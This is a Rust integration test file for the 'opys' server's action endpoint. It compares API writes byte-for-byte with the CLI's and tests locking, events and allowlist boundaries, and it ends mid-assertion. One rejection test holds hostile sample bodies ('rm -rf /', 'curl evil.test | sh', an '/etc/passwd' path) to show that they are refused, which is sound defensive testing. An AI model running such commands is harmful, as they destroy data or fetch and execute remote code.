//! The action endpoint over real corpora, driven through the router (TASK-0072).
//!
//! Every end-to-end case is checked the same way: the write is performed twice —
//! once through the router against one project, once by running **the real CLI**
//! in-process against a byte-identical copy — and the two inventories must come
//! out identical afterwards. The reference is `opys_engine::run`, the same
//! dispatch the `opys` binary calls, rather than a transcription of the cycle:
//! a transcription is a third copy that can only prove the server agrees with
//! this file's author, and it did — neutering `commands::maybe_sync` turned
//! `opys/tests/cli.rs` red while every test here stayed green.
//!
//! Expectations are likewise read off the engine (the id it allocated, the
//! message it produced) rather than hand-written.
//!
//! Every test runs on a multi-threaded runtime: a write blocks a thread on the
//! inventory lock, both in the handler and in the reference cycle below, and a
//! test about writes should not depend on which flavor tolerates that.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, Once};
use std::time::Duration;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use clap::Parser;
use http_body_util::BodyExt;
use opys_backend_markdown_local::MarkdownLocal;
use opys_engine::backend::Backend;
use opys_engine::cli::Cli;
use opys_engine::doc::Doc;
use opys_engine::error::Result;
use opys_server::actor::{Event, DEBOUNCE};
use opys_server::api::{self, AppState};
use opys_server::manager::Manager;
use serde_json::{json, Value};
use tokio::sync::broadcast;
use tower::ServiceExt;

const CONFIG: &str = r#"
base = "inventory"

[types.note]
prefix = "NOTE"
statuses = ["open", "closed"]
default_status = "open"
terminal_statuses = ["closed"]
tags_required = false

[types.task]
prefix = "TASK"
statuses = ["todo", "doing", "blocked", "done"]
default_status = "todo"
terminal_statuses = ["done"]
tags_required = false

[types.spec]
prefix = "SPEC"
statuses = ["open"]
default_status = "open"
tags_required = false

[types.spec.fields.priority]
type = "enum"
values = ["low", "high"]

[types.spec.fields.estimate]
type = "int"

[[types.spec.sections]]
heading = "Plan"
kind = "prose"
required = true
"#;

/// Process-global settings every test in this binary needs, set once and to the
/// same values, so the writes racing each other cannot disagree about them.
///
/// `OPYS_NOW` is the important one: `commands::touch` stamps `updated` from it,
/// and the two halves of every comparison below run seconds apart in wall-clock
/// terms. Without a pin they would straddle a second boundary and the bytes
/// would differ for a reason that has nothing to do with the endpoint.
/// `OPYS_LOCK_TIMEOUT_MS` is generous rather than short on purpose: it is the
/// deadlock detector for `action_and_cli_interleave_safely`, and a short one
/// would flake on a loaded machine instead of catching anything.
fn init() {
    static ONCE: Once = Once::new();
    ONCE.call_once(|| {
        std::env::set_var("OPYS_NOW", "2026-02-03T04:05:06Z");
        std::env::set_var("OPYS_LOCK_TIMEOUT_MS", "5000");
    });
}

fn backend() -> Box<dyn Backend + Send> {
    Box::new(MarkdownLocal)
}

/// Two documents, one of each type, already linked: `close` then has a reference
/// to strike, `block` has a real blocker to record, and the note's prose carries
/// a bare id for the auto-sync pass to linkify.
///
/// `created`/`updated` are written out rather than left to be backfilled: the
/// sync pass fills a missing pair from the file's mtime, and the two copies are
/// created milliseconds apart.
fn project(root: &Path) -> PathBuf {
    let inventory = root.join("inventory");
    std::fs::create_dir_all(&inventory).unwrap();
    std::fs::write(root.join("opys.toml"), CONFIG).unwrap();
    std::fs::write(
        inventory.join("NOTE-0001.md"),
        "---\n\
         id: NOTE-0001\n\
         status: open\n\
         tags: [alpha]\n\
         created: \"2026-01-01T00:00:00Z\"\n\
         updated: \"2026-01-01T00:00:00Z\"\n\
         ---\n\n# Note one\n\nWaiting on TASK-0002 to land.\n",
    )
    .unwrap();
    std::fs::write(
        inventory.join("TASK-0002.md"),
        "---\n\
         id: TASK-0002\n\
         status: todo\n\
         tags: [shared]\n\
         created: \"2026-01-01T00:00:00Z\"\n\
         updated: \"2026-01-01T00:00:00Z\"\n\
         references:\n  NOTE-0001: Note one\n\
         ---\n\n# Do the thing\n\nWork.\n",
    )
    .unwrap();
    std::fs::canonicalize(root).unwrap()
}

/// Every file under a project's inventory, path relative to the root → contents.
///
/// The whole tree rather than one document: a write can also delete a file,
/// relocate one onto a new layout path, or rewrite the retired-id ledger, and
/// all three are part of "what the CLI would have done".
fn snapshot(root: &Path) -> BTreeMap<String, String> {
    walkdir::WalkDir::new(root.join("inventory"))
        .sort_by_file_name()
        .into_iter()
        .filter_map(std::result::Result::ok)
        .filter(|e| e.file_type().is_file())
        .map(|e| {
            let rel = e
                .path()
                .strip_prefix(root)
                .expect("everything walked is under the root")
                .to_string_lossy()
                .into_owned();
            (rel, std::fs::read_to_string(e.path()).expect("a text file"))
        })
        .collect()
}

/// Run the real CLI against `root`, in-process.
///
/// This is `opys_engine::run` — the same function the `opys` binary calls with
/// the same clap-parsed [`Cli`] — so the reference is `src/commands/*::run`,
/// `maybe_sync` and clap's defaults rather than a copy of them. The order those
/// establish is not the obvious one and is what the byte comparisons pin: the
/// flush and the auto-sync pass happen *even when the core refused* (except for
/// `new`, where a refusal propagates before either), and the sync is its own
/// second load/flush cycle rather than a pass over the store above.
///
/// Stdout gets the CLI's success line, which is harmless here; a refusal comes
/// back as the `OpysError` the binary would exit 2 on.
fn cli(root: &Path, args: &[&str]) -> Result<()> {
    let mut argv = vec![
        "opys".to_string(),
        "--root".to_string(),
        root.to_string_lossy().into_owned(),
    ];
    argv.extend(args.iter().map(|a| (*a).to_string()));
    opys_engine::run(Cli::parse_from(argv), Box::new(MarkdownLocal)).map(|_exit_code| ())
}

/// The inventory-relative paths that appeared between two snapshots.
///
/// How the reference copy reports what `opys new` created: the CLI prints the
/// path and returns nothing, and reading the id off the file that appeared is
/// what makes the id in the assertions the engine's rather than this file's.
fn appeared(before: &BTreeMap<String, String>, after: &BTreeMap<String, String>) -> Vec<String> {
    after
        .keys()
        .filter(|p| !before.contains_key(*p))
        .cloned()
        .collect()
}

/// A node serving one project, plus an unserved byte-identical copy of it to
/// compare against.
///
/// Field order is load-bearing, and the tempdir comes last: Rust drops fields in
/// declaration order, so the [`AppState`] — and with it the manager and its
/// corpus actors — goes first, and the actors are told to stop before their
/// inventory is pulled out from under them.
struct Fixture {
    state: AppState,
    cid: String,
    /// The served copy, written through the API.
    live: PathBuf,
    /// The unserved copy, written through the engine cores directly. No actor
    /// watches it, so nothing but the reference cycle ever touches it.
    reference: PathBuf,
    /// Both inventories before anything was written.
    pristine: BTreeMap<String, String>,
    _dir: tempfile::TempDir,
}

impl Fixture {
    fn new() -> Fixture {
        init();
        let dir = tempfile::tempdir().unwrap();
        let live = project(&dir.path().join("live"));
        let reference = project(&dir.path().join("reference"));
        let config = dir.path().join("config/server.toml");
        std::fs::create_dir_all(config.parent().unwrap()).unwrap();
        std::fs::write(
            &config,
            format!("[[project]]\npath = {:?}\n", live.display().to_string()),
        )
        .unwrap();

        let pristine = snapshot(&live);
        assert_eq!(
            pristine,
            snapshot(&reference),
            "the two copies must start identical or nothing below means anything"
        );

        let (events, _) = broadcast::channel(32);
        let mut manager = Manager::new(config, events.clone(), backend);
        manager.rescan().unwrap();
        let cid = manager.cids().pop().expect("one corpus is served");

        Fixture {
            state: AppState::new(Arc::new(Mutex::new(manager)), events),
            cid,
            live,
            reference,
            pristine,
            _dir: dir,
        }
    }

    async fn send(&self, request: Request<Body>) -> (StatusCode, Value) {
        let response = api::router(self.state.clone())
            .oneshot(request)
            .await
            .unwrap();
        let status = response.status();
        let bytes = response.into_body().collect().await.unwrap().to_bytes();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }

    async fn get(&self, uri: &str) -> (StatusCode, Value) {
        self.send(Request::builder().uri(uri).body(Body::empty()).unwrap())
            .await
    }

    /// POST an action body, whatever it answers.
    async fn try_action(&self, body: Value) -> (StatusCode, Value) {
        post_action(&self.state, &self.cid, body).await
    }

    /// POST an action body and require it to have been performed.
    async fn action(&self, body: Value) -> Value {
        let (status, answer) = self.try_action(body).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["ok"], true, "{answer}");
        answer
    }

    /// The two inventories agree, and something actually happened — two
    /// inventories that were never written to agree as well.
    fn assert_mirrors_reference(&self) {
        let live = snapshot(&self.live);
        let reference = snapshot(&self.reference);
        assert_eq!(
            live, reference,
            "the API left different bytes on disk than the same engine core did"
        );
        assert_ne!(live, self.pristine, "the action changed nothing on disk");
    }

    fn read(&self, relpath: &str) -> String {
        std::fs::read_to_string(self.live.join(relpath)).expect("the document is on disk")
    }

    /// Poll the corpus's warm cache until `id` is no longer listed, and return
    /// whatever it lists at the end so a failure can report it.
    ///
    /// Polled through the router rather than the manager: a test must not take
    /// the manager lock on a reactor thread any more than a handler may.
    async fn docs_until_absent(&self, id: &str, within: Duration) -> Vec<Value> {
        let deadline = tokio::time::Instant::now() + within;
        loop {
            let (_, listed) = self.get(&format!("/api/corpus/{}/docs", self.cid)).await;
            let listed: Vec<Value> = listed.as_array().cloned().unwrap_or_default();
            if !listed.iter().any(|d| d["id"] == id) || tokio::time::Instant::now() >= deadline {
                return listed;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }
}

/// POST one action body to a state's router, whatever it answers. A free
/// function so a test can drive a node the [`Fixture`] does not describe.
async fn post_action(state: &AppState, cid: &str, body: Value) -> (StatusCode, Value) {
    let request = Request::builder()
        .method("POST")
        .uri(format!("/api/corpus/{cid}/action"))
        .header("content-type", "application/json")
        .body(Body::from(body.to_string()))
        .unwrap();
    let response = api::router(state.clone()).oneshot(request).await.unwrap();
    let status = response.status();
    let bytes = response.into_body().collect().await.unwrap().to_bytes();
    (
        status,
        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
    )
}

/// The next `action-completed` event, if one arrives in time.
///
/// Other events are skipped rather than treated as failures: the write also
/// trips the corpus watcher, so a `corpus-reloaded` can arrive before, between
/// or after — a subscriber must tolerate both, and so must this.
async fn next_action_completed(
    events: &mut broadcast::Receiver<Event>,
    within: Duration,
) -> Option<(String, String, String)> {
    let deadline = tokio::time::Instant::now() + within;
    loop {
        match tokio::time::timeout_at(deadline, events.recv()).await {
            Ok(Ok(Event::ActionCompleted { cid, action, id })) => return Some((cid, action, id)),
            Ok(Ok(_)) => continue,
            Ok(Err(_)) | Err(_) => return None,
        }
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn new_writes_what_the_cli_writes() {
    let fx = Fixture::new();
    // No `status`, so the type's default has to be applied by `new::core` and
    // not by anything in the server.
    let answer = fx
        .action(json!({
            "action": "new", "type": "task", "title": "Third thing", "tags": "alpha,beta"
        }))
        .await;

    // No `--status` either, so clap's default reaches the core the same way.
    cli(
        &fx.reference,
        &[
            "new",
            "--type",
            "task",
            "--title",
            "Third thing",
            "--tags",
            "alpha,beta",
        ],
    )
    .expect("the CLI accepts the same creation");
    let created_path = match appeared(&fx.pristine, &snapshot(&fx.reference)).as_slice() {
        [only] => only.clone(),
        other => panic!("`opys new` created {} files: {other:?}", other.len()),
    };
    let id = Path::new(&created_path)
        .file_stem()
        .and_then(|s| s.to_str())
        .expect("the created file is <ID>.md")
        .to_string();

    assert_eq!(
        answer["id"], id,
        "both copies draw from the same global sequence"
    );
    assert_eq!(
        answer["message"], created_path,
        "`opys new` prints the created document's path — the message is that path, \
         relative to the project root like every other path the API emits"
    );
    let created = fx.read(&created_path);
    assert!(
        created.contains("status: todo"),
        "the empty status must reach the core, which resolves the type's default: {created}"
    );
    fx.assert_mirrors_reference();
}

#[tokio::test(flavor = "multi_thread")]
async fn set_status_writes_what_the_cli_writes() {
    let fx = Fixture::new();
    let answer = fx
        .action(json!({"action": "set-status", "id": "TASK-0002", "status": "doing"}))
        .await;
    assert_eq!(answer["id"], "TASK-0002");
    assert_eq!(answer["message"], "TASK-0002 -> doing");

    cli(&fx.reference, &["set-status", "TASK-0002", "doing"])
        .expect("the CLI accepts the same transition");
    fx.assert_mirrors_reference();
}

#[tokio::test(flavor = "multi_thread")]
async fn tag_writes_what_the_cli_writes_and_runs_the_sync_pass() {
    let fx = Fixture::new();
    let answer = fx
        .action(json!({
            "action": "tag", "id": "NOTE-0001", "add": "beta,gamma", "remove": "alpha"
        }))
        .await;

    cli(
        &fx.reference,
        &[
            "tag",
            "NOTE-0001",
            "--add",
            "beta,gamma",
            "--remove",
            "alpha",
        ],
    )
    .expect("the CLI accepts the same edit");
    // `opys tag` prints the resulting tag list, which is the one the reference
    // copy now carries — read back through the engine's own parser rather than
    // spelled out here.
    let reference_note = std::fs::read_to_string(fx.reference.join("inventory/NOTE-0001.md"))
        .expect("the reference note is on disk");
    let tags = Doc::parse(PathBuf::from("NOTE-0001.md"), &reference_note)
        .expect("the reference note parses")
        .frontmatter
        .tags()
        .unwrap_or_default();
    assert_eq!(answer["id"], "NOTE-0001");
    assert_eq!(
        answer["message"],
        format!("NOTE-0001 tags: {}", tags.join(", ")),
        "the message is `opys tag`'s line, built from the list the core returned"
    );
    fx.assert_mirrors_reference();

    // The auto-sync pass is part of the cycle, not an extra step the CLI takes
    // afterwards: the bare id in the note's prose is a link now, and the reverse
    // of the task's reference has been reconciled onto the note.
    let note = fx.read("inventory/NOTE-0001.md");
    assert!(
        note.contains("](TASK-0002.md)"),
        "prose was linkified: {note}"
    );
    assert!(
        note.contains("TASK-0002: Do the thing"),
        "the reverse reference was reconciled: {note}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn block_writes_what_the_cli_writes() {
    let fx = Fixture::new();
    let answer = fx
        .action(json!({"action": "block", "id": "TASK-0002", "by": "NOTE-0001"}))
        .await;
    assert_eq!(answer["id"], "TASK-0002");
    assert_eq!(answer["message"], "TASK-0002 blocked by NOTE-0001");

    cli(&fx.reference, &["block", "TASK-0002", "--by", "NOTE-0001"])
        .expect("the CLI accepts the same link");
    fx.assert_mirrors_reference();

    // The task type declares a `blocked` status, so the core auto-set it and
    // remembered where it came from. Both are the engine's doing, and the byte
    // comparison above is what proves the server did not reimplement either.
    let task = fx.read("inventory/TASK-0002.md");
    assert!(task.contains("status: blocked"), "{task}");
    assert!(task.contains("blocked_from: todo"), "{task}");
}

#[tokio::test(flavor = "multi_thread")]
async fn unblock_writes_what_the_cli_writes() {
    let fx = Fixture::new();
    fx.action(json!({"action": "block", "id": "TASK-0002", "by": "NOTE-0001"}))
        .await;
    cli(&fx.reference, &["block", "TASK-0002", "--by", "NOTE-0001"])
        .expect("the CLI accepts the same link");
    fx.assert_mirrors_reference();

    let answer = fx
        .action(json!({"action": "unblock", "id": "TASK-0002", "by": "NOTE-0001"}))
        .await;
    assert_eq!(answer["id"], "TASK-0002");
    assert_eq!(
        answer["message"],
        "TASK-0002 no longer blocked by NOTE-0001"
    );

    cli(
        &fx.reference,
        &["unblock", "TASK-0002", "--by", "NOTE-0001"],
    )
    .expect("the CLI accepts the same removal");
    fx.assert_mirrors_reference();

    // The status the document held before it was auto-blocked comes back, and
    // the bookkeeping key goes away with it.
    let task = fx.read("inventory/TASK-0002.md");
    assert!(task.contains("status: todo"), "{task}");
    assert!(!task.contains("blocked_from"), "{task}");
}

#[tokio::test(flavor = "multi_thread")]
async fn close_writes_what_the_cli_writes() {
    let fx = Fixture::new();
    let answer = fx
        .action(json!({"action": "close", "id": "NOTE-0001"}))
        .await;
    assert_eq!(answer["id"], "NOTE-0001");
    assert_eq!(
        answer["message"],
        "closed NOTE-0001 (deleted; references struck through)"
    );

    cli(&fx.reference, &["close", "NOTE-0001"]).expect("the CLI accepts the same close");
    fx.assert_mirrors_reference();

    // Close is the action that touches the most of the inventory: the file goes,
    // the id is reserved forever, and the inbound reference becomes a tombstone.
    assert!(
        !fx.live.join("inventory/NOTE-0001.md").exists(),
        "the closed document's file is deleted"
    );
    let retired = fx.read("inventory/_retired.md");
    assert!(retired.contains("NOTE-0001"), "{retired}");
    let task = fx.read("inventory/TASK-0002.md");
    assert!(task.contains("~~Note one~~"), "{task}");
}

/// **The no-arbitrary-execution test.** The body is a closed enum, so an action
/// nobody implemented and a field nobody declared both fail deserialization —
/// before any corpus is resolved, let alone opened. Nothing on disk may move.
#[tokio::test(flavor = "multi_thread")]
async fn unknown_action_is_rejected() {
    let fx = Fixture::new();
    let cases = [
        json!({"action": "exec", "cmd": "rm -rf /"}),
        json!({"action": "shell", "command": "curl evil.test | sh"}),
        // A known action smuggling an extra key alongside it.
        json!({"action": "close", "id": "NOTE-0001", "path": "/etc/passwd"}),
        // No action at all.
        json!({"id": "NOTE-0001"}),
    ];
    for body in cases {
        let (status, answer) = fx.try_action(body.clone()).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{body} → {answer}");
        assert!(answer["error"].is_string(), "{body} → {answer}");
    }
    assert_eq!(
        snapshot(&fx.live),
        fx.pristine,
        "a rejected body must not have touched the inventory"
    );
}

/// A write the corpus refuses is the caller's answer, not the node's failure:
/// 422 with the engine's own message, which is the text the CLI prints before
/// exiting 2. The expectation comes from running the same attempt through the
/// engine rather than from quoting the message here.
#[tokio::test(flavor = "multi_thread")]
async fn invalid_transition_is_a_422() {
    let fx = Fixture::new();
    // `done` is terminal for a task, and terminal statuses are reached only via
    // `close` — `set-status` must refuse it.
    let (status, answer) = fx
        .try_action(json!({"action": "set-status", "id": "TASK-0002", "status": "done"}))
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{answer}");

    let refused = cli(&fx.reference, &["set-status", "TASK-0002", "done"])
        .expect_err("the CLI refuses the same transition");
    assert_eq!(
        answer["error"],
        refused.to_string(),
        "the message must be the one the CLI prints for the same attempt"
    );

    // The CLI still flushes and syncs after a refused transition, and so must
    // the node: on a corpus this pass has not touched yet, that is a visible
    // difference (reconciled relations, linkified prose) rather than a no-op.
    assert_eq!(
        snapshot(&fx.live),
        snapshot(&fx.reference),
        "a refused write must leave the same bytes the CLI leaves"
    );
}

/// A server action and a real `opys` invocation *at the same time*, against a
/// corpus with a warm actor watching it. Both must land: the inventory lock
/// serializes them, and neither may deadlock against the actor's reloads (which
/// take the same lock) or lose the other's write.
///
/// The overlap is the point. Run back to back, the two writers never want the
/// flock at once and the test would pass just as well with a per-process lock,
/// or with the handler holding the manager mutex across the cycle. Here the CLI
/// cycle runs on a blocking thread while the action is in flight, so the flock
/// is something this test actually depends on — and the lock timeout is the
/// detector, failing after `OPYS_LOCK_TIMEOUT_MS` rather than hanging forever.
#[tokio::test(flavor = "multi_thread")]
async fn action_and_cli_interleave_safely() {
    let fx = Fixture::new();
    let live = fx.live.clone();

    // Exactly what a concurrent `opys tag` does, against the *served* copy.
    let concurrent_cli =
        tokio::task::spawn_blocking(move || cli(&live, &["tag", "TASK-0002", "--add", "from-cli"]));
    let (_, cli_done) = tokio::join!(
        fx.action(json!({"action": "tag", "id": "NOTE-0001", "add": "from-api"})),
        concurrent_cli,
    );
    cli_done
        .expect("the CLI task did not panic")
        .expect("a CLI write must not be blocked by the server");

    // …and again afterwards, so the CLI's own flock windows are proven released.
    fx.action(json!({"action": "tag", "id": "NOTE-0001", "add": "after-the-cli"}))
        .await;

    let note = fx.read("inventory/NOTE-0001.md");
    assert!(
        note.contains("from-api"),
        "the first API write survives: {note}"
    );
    assert!(
        note.contains("after-the-cli"),
        "the second API write landed: {note}"
    );
    let task = fx.read("inventory/TASK-0002.md");
    assert!(
        task.contains("from-cli"),
        "the CLI write was not clobbered by the API's next cycle: {task}"
    );
}

/// Six creations in flight at once. Every one must get its own id from the
/// single global sequence and its own file: an id is allocated inside the
/// locked window, so two cycles that overlapped without serializing would hand
/// out the same number and one document would overwrite the other.
#[tokio::test(flavor = "multi_thread")]
async fn concurrent_new_actions_allocate_distinct_ids() {
    let fx = Fixture::new();
    let answers = futures_util::future::join_all((0..6).map(|n| {
        fx.action(json!({
            "action": "new", "type": "note", "title": format!("Concurrent {n}")
        }))
    }))
    .await;

    let mut ids: Vec<String> = answers
        .iter()
        .map(|a| a["id"].as_str().expect("every answer names its id").into())
        .collect();
    ids.sort();
    ids.dedup();
    assert_eq!(ids.len(), 6, "two creations shared an id: {answers:?}");
    for answer in &answers {
        let path = answer["message"].as_str().expect("a path");
        assert!(
            fx.live.join(path).is_file(),
            "{path} was reported created but is not on disk"
        );
    }
}

/// The event says the write happened; the warm cache catches up on its own.
///
/// Both halves matter. The node acknowledges through `action-completed`
/// immediately, and the corpus actor — which was never written through — notices
/// the same change via its watcher and drops the document within a debounce
/// window or two.
#[tokio::test(flavor = "multi_thread")]
async fn close_broadcasts_and_cache_catches_up() {
    let fx = Fixture::new();
    // Subscribed before the request: an event published in the gap would
    // otherwise reach nobody and this would wait out its deadline for nothing.
    let mut events = fx.state.events.subscribe();
    let (_, before) = fx.get(&format!("/api/corpus/{}/docs", fx.cid)).await;
    assert_eq!(before.as_array().unwrap().len(), 2, "{before}");

    fx.action(json!({"action": "close", "id": "NOTE-0001"}))
        .await;

    let completed = next_action_completed(&mut events, Duration::from_secs(5))
        .await
        .expect("an action-completed event");
    assert_eq!(
        completed,
        (fx.cid.clone(), "close".into(), "NOTE-0001".into())
    );

    // The write happened outside the actor entirely, so this is the watcher
    // doing its job — the same path an `opys close` at a terminal would take.
    // Generous compared with the 250 ms debounce, because the cycle takes the
    // inventory lock twice and the actor's reload queues behind those.
    let remaining = fx.docs_until_absent("NOTE-0001", DEBOUNCE * 20).await;
    assert!(
        !remaining.iter().any(|d| d["id"] == "NOTE-0001"),
        "the closed document is still in the warm cache: {remaining:?}"
    );
    assert!(
        remaining.iter().any(|d| d["id"] == "TASK-0002"),
        "the rest of the corpus is still served: {remaining:?}"
    );
}

/// **The allowlist-escape test.** Approving a project and running the node are
/// separate acts (ADR-0077), and the allowlist is the whole boundary — but
/// `Project::open` searches *upward* for `opys.toml`, so a corpus that has lost
/// its own config would fall through to the enclosing project, which nobody
/// approved. `Manager::refresh` only retires such a corpus on its next 60 s
/// tick, and nested projects are the normal shape (a `[[prefix]]` entry, a git
/// worktree inside its main repo), so the window is real and reachable.
#[tokio::test(flavor = "multi_thread")]
async fn a_corpus_that_lost_its_config_cannot_write_through_its_parent() {
    init();
    let dir = tempfile::tempdir().unwrap();
    let outer = project(&dir.path().join("outer"));
    let inner = project(&outer.join("inner"));
    let config = dir.path().join("config/server.toml");
    std::fs::create_dir_all(config.parent().unwrap()).unwrap();
    std::fs::write(
        &config,
        // Only the inner project is allowlisted. `outer` never is.
        format!("[[project]]\npath = {:?}\n", inner.display().to_string()),
    )
    .unwrap();

    let (events, _rx) = broadcast::channel(32);
    let mut manager = Manager::new(config, events.clone(), backend);
    manager.rescan().unwrap();
    let cid = manager.cids().pop().expect("the inner project is served");
    let state = AppState::new(Arc::new(Mutex::new(manager)), events);

    // A branch switch, a `git worktree remove`, a rename: the config goes.
    std::fs::remove_file(inner.join("opys.toml")).unwrap();
    let untouched = snapshot(&outer);

    for body in [
        json!({"action": "new", "type": "note", "title": "Escaped"}),
        json!({"action": "tag", "id": "NOTE-0001", "add": "reached-the-parent"}),
        json!({"action": "close", "id": "TASK-0002"}),
    ] {
        let (status, answer) = post_action(&state, &cid, body.clone()).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{body} → {answer}");
        assert!(answer["error"].is_string(), "{body} → {answer}");
    }
    assert_eq!(
        snapshot(&outer),
        untouched,
        "a write addressed to the inner corpus reached the enclosing project"
    );
}

/// A write whose auto-sync pass was refused is still a success — the bytes are
/// on disk and a retry would apply them twice — but the client has to be told,
/// because the node is headless and this response is the only channel it has.
/// The CLI's user gets `note: skipped sync (run `opys verify` …)` on stderr.
#[tokio::test(flavor = "multi_thread")]
async fn a_skipped_sync_pass_is_reported_on_the_success_payload() {
    let fx = Fixture::new();
    // What an unresolved merge leaves behind: frontmatter that will not parse.
    // `sync::run` refuses the whole pass while any document is in this state.
    let conflicted = "---\n<<<<<<< HEAD\nid: NOTE-0009\n=======\nid: NOTE-0010\n\
                      >>>>>>> theirs\nstatus: open\n---\n\n# Conflicted\n";
    for root in [&fx.live, &fx.reference] {
        std::fs::write(root.join("inventory/NOTE-0009.md"), conflicted).unwrap();
    }

    let answer = fx
        .action(json!({"action": "tag", "id": "NOTE-0001", "add": "delta"}))
        .await;
    assert!(
        answer["sync_skipped"].is_string(),
        "the pass was skipped and the client was not told: {answer}"
    );

    // The CLI still exits 0 for the same command, and leaves the same bytes:
    // reporting the skip must not have changed what the write did.
    cli(&fx.reference, &["tag", "NOTE-0001", "--add", "delta"])
        .expect("the CLI treats a skipped sync as a success too");
    fx.assert_mirrors_reference();
    assert!(
        fx.read("inventory/NOTE-0001.md").contains("delta"),
        "the write itself is authoritative"
    );
}

/// A client that hangs up mid-cycle still gets its write performed —
/// `spawn_blocking` cannot be cancelled — so the acknowledgement every other
/// subscriber is waiting for must not be lost with the response.
#[tokio::test(flavor = "multi_thread")]
async fn the_completion_event_survives_a_client_hanging_up() {
    let fx = Fixture::new();
    let mut events = fx.state.events.subscribe();

    // Park the cycle where a real one parks: on the inventory lock. Exactly what
    // a concurrent `opys` invocation holds.
    let prj = opys_engine::project::Project::open(&fx.live.to_string_lossy()).unwrap();
    let (mut store, _errors) = MarkdownLocal.load(&prj).expect("the test takes the lock");

    // The browser tab closes / `fetch` is aborted: the handler future is dropped
    // while the blocking task is still waiting.
    let abandoned = tokio::time::timeout(
        Duration::from_millis(200),
        fx.try_action(json!({"action": "tag", "id": "NOTE-0001", "add": "client-hung-up"})),
    )
    .await;
    assert!(abandoned.is_err(), "the request should not have finished");

    drop(store.take_lock());
    drop(store);

    let completed = next_action_completed(&mut events, Duration::from_secs(10))
        .await
        .expect("the write happened, so the event must have been published");
    assert_eq!(
        completed,
        (fx.cid.clone(), "tag".into(), "NOTE-0001".into())
    );
    assert!(
        fx.read("inventory/NOTE-0001.md").contains("client-hung-up"),
        "the write really did land — that is why the event matters"
    );
}

/// A corpus whose watcher never started must still catch up.
///
/// Nothing else in the node reloads an actor: `refresh` only drops corpora that
/// vanished and `rescan` skips cids it already serves. So when `spawn_watcher`
/// fails — here because the inventory directory did not exist yet when the
/// project was allowlisted, but equally on WSL `/mnt`, a network mount, or after
/// the directory is replaced wholesale — the cache would be frozen for the life
/// of the process while every write answered 200.
#[tokio::test(flavor = "multi_thread")]
async fn a_write_reaches_the_cache_without_a_watcher() {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("fresh");
    std::fs::create_dir_all(&root).unwrap();
    std::fs::write(root.join("opys.toml"), CONFIG).unwrap();
    // Deliberately no inventory directory: `watcher.watch(&corpus.base, …)`
    // cannot watch what is not there, and `spawn_watcher` then returns None.
    let root = std::fs::canonicalize(&root).unwrap();
    let config = dir.path().join("config/server.toml");
    std::fs::create_dir_all(config.parent().unwrap()).unwrap();
    std::fs::write(
        &config,
        format!("[[project]]\npath = {:?}\n", root.display().to_string()),
    )
    .unwrap();

    let (events, _rx) = broadcast::channel(32);
    let mut manager = Manager::new(config, events.clone(), backend);
    manager.rescan().unwrap();
    let cid = manager.cids().pop().expect("the project is served");
    let state = AppState::new(Arc::new(Mutex::new(manager)), events);

    let (status, answer) = post_action(
        &state,
        &cid,
        json!({"action": "new", "type": "note", "title": "First"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{answer}");

    // No polling and no sleep: by the time the 200 is written the cache reflects
    // the write, because the handler asked the actor rather than hoping.
    let request = Request::builder()
        .uri(format!("/api/corpus/{cid}/docs"))
        .body(Body::empty())
        .unwrap();
    let response = api::router(state.clone()).oneshot(request).await.unwrap();
    let bytes = response.into_body().collect().await.unwrap().to_bytes();
    let listed: Value = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(
        listed.as_array().map(Vec::len),
        Some(1),
        "the warm cache never saw the write: {listed}"
    );
    assert_eq!(listed[0]["id"], answer["id"], "{listed}");
}

/// The event is a normal member of the stream: same `event` tag, same
/// kebab-case vocabulary, so the WebSocket pump forwards it without knowing it
/// exists.
#[tokio::test(flavor = "multi_thread")]
async fn the_completion_event_serializes_like_every_other_event() {
    let fx = Fixture::new();
    let mut events = fx.state.events.subscribe();
    fx.action(json!({"action": "set-status", "id": "TASK-0002", "status": "doing"}))
        .await;

    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    let wire = loop {
        let event = tokio::time::timeout_at(deadline, events.recv())
            .await
            .expect("an event arrives")
            .expect("the channel stays open");
        let wire: Value = serde_json::to_value(&event).expect("every event serializes");
        if wire["event"] == "action-completed" {
            break wire;
        }
    };
    assert_eq!(
        wire,
        json!({
            "event": "action-completed",
            "cid": fx.cid,
            "action": "set-status",
            "id": "TASK-0002",
        })
    );
}

/// A document of the section-requiring type, written into one tree.
///
/// Written directly rather than through the fixture, so the shared fixture's
/// id allocation — which other tests pin — never changes.
fn write_spec(root: &Path) {
    std::fs::write(
        root.join("inventory/SPEC-0003.md"),
        "---\n\
         id: SPEC-0003\n\
         status: open\n\
         tags: []\n\
         created: \"2026-01-01T00:00:00Z\"\n\
         updated: \"2026-01-01T00:00:00Z\"\n\
         ---\n\n# The spec\n\nIntro.\n\n## Plan\n\nSteps.\n",
    )
    .unwrap();
}

#[tokio::test(flavor = "multi_thread")]
async fn edit_body_replaces_the_body_and_rederives_the_title() {
    init();
    let fx = Fixture::new();
    write_spec(&fx.live);

    let answer = fx
        .action(json!({
            "action": "edit-body",
            "id": "SPEC-0003",
            "body": "# The spec, renamed\n\nBetter intro.\n\n## Plan\n\nSharper steps.\n"
        }))
        .await;
    assert_eq!(answer["id"], "SPEC-0003");

    let written = std::fs::read_to_string(fx.live.join("inventory/SPEC-0003.md")).unwrap();
    assert!(written.contains("# The spec, renamed"), "{written}");
    assert!(written.contains("Sharper steps."), "{written}");
    assert!(
        !written.contains("Intro."),
        "the old body must be gone: {written}"
    );
    // The title the API now reports is the new heading, not the old one.
    let (status, doc) = fx
        .get(&format!("/api/corpus/{}/doc/SPEC-0003", fx.cid))
        .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(doc["title"], "The spec, renamed");
    // The write stamped `updated` (OPYS_NOW pins the clock for this binary).
    assert!(
